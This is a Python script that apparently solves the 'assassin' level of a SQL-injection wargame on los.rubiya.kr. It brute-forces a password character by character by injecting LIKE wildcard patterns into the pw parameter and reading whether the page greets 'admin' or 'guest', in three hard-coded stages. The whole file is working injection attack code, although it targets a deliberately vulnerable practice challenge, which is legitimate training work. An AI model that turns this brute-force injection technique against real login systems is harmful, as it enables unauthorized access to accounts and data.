import requests

cookie = {'PHPSESSID' : '~~~~'}
find_ad = 0

# stage 1
print("stage 1...")
for i in range(48, 123):
    url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw=%s%%" % chr(i)
    res = requests.get(url, cookies=cookie)

    if "Hello admin" in res.text:
        print(url.split('?')[1],"-> admin")
        find_ad = 1
        break
    
    elif "Hello guest" in res.text:
        print(url.split('?')[1],"-> guest")

        
# stage 2
print("\nstage 2...")
if not find_ad:
    for i in range(48, 123):
        url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw=9%s%%" % chr(i)
        res = requests.get(url, cookies=cookie)

        if "Hello admin" in res.text:
            print(url.split('?')[1],"-> admin")
            find_ad = 1
            break

        elif "Hello guest" in res.text:
            print(url.split('?')[1],"-> guest")
            

# stage 3
print("\nstage 3...")
if not find_ad:
    for i in range(48, 123):
        url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw=90%s%%" % chr(i)
        res = requests.get(url, cookies=cookie)

        if "Hello admin" in res.text:
            print(url.split('?')[1],"-> admin")
            find_ad = 1
            break

        elif "Hello guest" in res.text:
            print(url.split('?')[1],"-> guest")